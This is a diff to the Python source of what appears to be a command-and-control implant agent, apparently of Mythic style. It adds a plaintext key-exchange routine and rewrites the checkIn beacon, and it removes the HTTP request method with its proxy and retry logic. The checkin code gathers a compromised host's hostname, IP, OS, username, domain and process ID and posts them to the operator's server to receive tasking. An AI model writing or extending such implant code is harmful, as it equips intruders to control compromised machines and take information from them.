@@ -157,118 +157,116 @@ CRYPTO_MODULE_PLACEHOLDER
             for packet in tasking_data["socks"]: self.socks_in.put(packet)
 
     
-    def checkIn(self):
-        hostname = socket.gethostname()
-        ip = ''
-        if hostname and len(hostname) > 0:
-            try:
-                ip = socket.gethostbyname(hostname)
-            except:
-                pass
-
-        data = {
-            "action": "checkin",
-            "ip": ip,
-            "os": self.getOSVersion(),
-            "user": self.getUsername(),
-            "host": hostname,
-            "domain": socket.getfqdn(),
-            "pid": os.getpid(),
-            "uuid": self.agent_config["PayloadUUID"],
-            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
-            "encryption_key": self.agent_config["enc_key"]["enc_key"],
-            "decryption_key": self.agent_config["enc_key"]["dec_key"]
-        }
-        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
-        decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
-        if not decoded_data:
-            return False
+    def perform_key_exchange(self):
+        """Perform initial key exchange with server - no encryption needed"""
         try:
-            response_json = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"], "", 1))
-            if "status" in response_json and "id" in response_json:
-                self.agent_config["UUID"] = response_json["id"]
+            data = {
+                "action": "key_exchange",
+                "uuid": self.agent_config["PayloadUUID"]
+            }
+            # Send unencrypted key exchange request
+            encoded_data = base64.b64encode(json.dumps(data).encode())
+            response = self.makeRequest(encoded_data, 'POST')
+            
+            if not response:
+                logger.error("No response received during key exchange")
+                return False
+                
+            # Decode response (should be unencrypted)
+            try:
+                decoded_response = base64.b64decode(response)
+                response_json = json.loads(decoded_response.decode())
+            except Exception as e:
+                logger.error(f"Failed to decode key exchange response: {str(e)}")
+                return False
+                
+            # Validate and store keys
+            if (response_json.get("action") == "key_exchange_response" and 
+                response_json.get("status") == "success"):
+                
+                self.agent_config["agent_to_server_key"] = response_json["encryption_key"]
+                self.agent_config["server_to_agent_key"] = response_json["decryption_key"]
+                
+                logger.info("Key exchange successful")
+                logger.debug(f"Agent-to-server key: {self.agent_config['agent_to_server_key'][:10]}...")
+                logger.debug(f"Server-to-agent key: {self.agent_config['server_to_agent_key'][:10]}...")
                 return True
             else:
+                logger.error(f"Invalid key exchange response: {response_json}")
                 return False
-        except json.JSONDecodeError as e:
+                
+        except Exception as e:
+            logger.error(f"Key exchange failed: {str(e)}")
             return False
 
-     
+    def checkIn(self):
+        """Perform encrypted checkin after key exchange is complete"""
+        try:
+            # Ensure we have encryption keys
+            if not self.agent_config.get("agent_to_server_key") or not self.agent_config.get("server_to_agent_key"):
+                logger.error("Cannot checkin without encryption keys")
+                return False
+                
+            hostname = socket.gethostname()
+            ip = ''
+            if hostname and len(hostname) > 0:
+                try:
+                    ip = socket.gethostbyname(hostname)
+                except:
+                    pass
 
-    def makeRequest(self, data, method='GET', max_retries=5, retry_delay=5):
-        # Build headers
-        hdrs = {}
-        for header in self.agent_config["Headers"]:
-            hdrs[header] = self.agent_config["Headers"][header]
-
-        # Build URL depending on method
-        if method == 'GET':
-            url = (
-                self.agent_config["Server"]
-                + ":" + self.agent_config["Port"]
-                + self.agent_config["GetURI"]
-                + "?" + self.agent_config["GetParam"]
-                + "=" + data.decode()
-            )
-            req = urllib.request.Request(url, None, hdrs)
-        else:
-            url = (
-                self.agent_config["Server"]
-                + ":" + self.agent_config["Port"]
-                + self.agent_config["PostURI"]
-            )
-            req = urllib.request.Request(url, data, hdrs)
-
-    
-        #CERTSKIP
-
-        # ----- PROXY HANDLING -----
-        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
-            tls = "https" if self.agent_config["ProxyHost"].startswith("https") else "http"
-            handler = urllib.request.HTTPSHandler if tls == "https" else urllib.request.HTTPHandler
-
-            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
-                proxy = urllib.request.ProxyHandler({
-                    tls: "{}://{}:{}@{}:{}".format(
-                        tls,
-                        self.agent_config["ProxyUser"],
-                        self.agent_config["ProxyPass"],
-                        self.agent_config["ProxyHost"].replace(tls + "://", ""),
-                        self.agent_config["ProxyPort"],
-                    )
-                })
-                auth = urllib.request.HTTPBasicAuthHandler()
-                opener = urllib.request.build_opener(proxy, auth, handler())
-            else:
-                proxy = urllib.request.ProxyHandler({
-                    tls: "{}://{}:{}".format(
-                        tls,
-                        self.agent_config["ProxyHost"].replace(tls + "://", ""),
-                        self.agent_config["ProxyPort"],
-                    )
-                })
-                opener = urllib.request.build_opener(proxy, handler())
-            urllib.request.install_opener(opener)
-
-        # ----- RETRY LOOP -----
-        for attempt in range(max_retries):
+            data = {
+                "action": "checkin",
+                "ip": ip,
+                "os": self.getOSVersion(),
+                "user": self.getUsername(),
+                "host": hostname,
+                "domain": socket.getfqdn(),
+                "pid": os.getpid(),
+                "uuid": self.agent_config["PayloadUUID"],
+                "architecture": "x64" if sys.maxsize > 2**32 else "x86",
+            }
+            
+            # Use the formatMessage method which handles encryption and UUID prepending
+            encoded_data = self.formatMessage(data)
+            if not encoded_data:
+                logger.error("Failed to format checkin message")
+                return False
+                
+            response = self.makeRequest(encoded_data, 'POST')
+            if not response:
+                logger.error("No response received from checkin request")
+                return False
+                
+            # Decrypt and parse response
+            decoded_data = self.decrypt(response)
+            if not decoded_data:
+                logger.error("Failed to decrypt checkin response")
+                return False
+                
             try:
-                # The builder may replace this line:
-                with urllib.request.urlopen(req) as response:
-                    raw_response = response.read()
-                    try:
-                        out = base64.b64decode(raw_response)
-                    except Exception:
-                        out = raw_response
-                    if out:  # Ensure response is not empty
-                        return out
-            except Exception:
-                pass
-
-            if attempt < max_retries - 1:
-                time.sleep(retry_delay)
-
-        return ""
+                # Remove UUID prefix from response
+                json_str = decoded_data.decode()
+                if json_str.startswith(self.agent_config["PayloadUUID"]):
+                    json_str = json_str.replace(self.agent_config["PayloadUUID"], "", 1)
+                    
+                response_json = json.loads(json_str)
+                
+                if "status" in response_json and "id" in response_json:
+                    self.agent_config["UUID"] = response_json["id"]
+                    logger.info(f"Checkin successful, assigned UUID: {self.agent_config['UUID']}")
+                    return True
+                else:
+                    logger.error(f"Invalid checkin response: {response_json}")
+                    return False
+                    
+            except json.JSONDecodeError as e:
+                logger.error(f"Failed to parse checkin response: {str(e)}")
+                return False
+                
+        except Exception as e:
+            logger.error(f"Checkin failed: {str(e)}")
+            return False
 
 
       
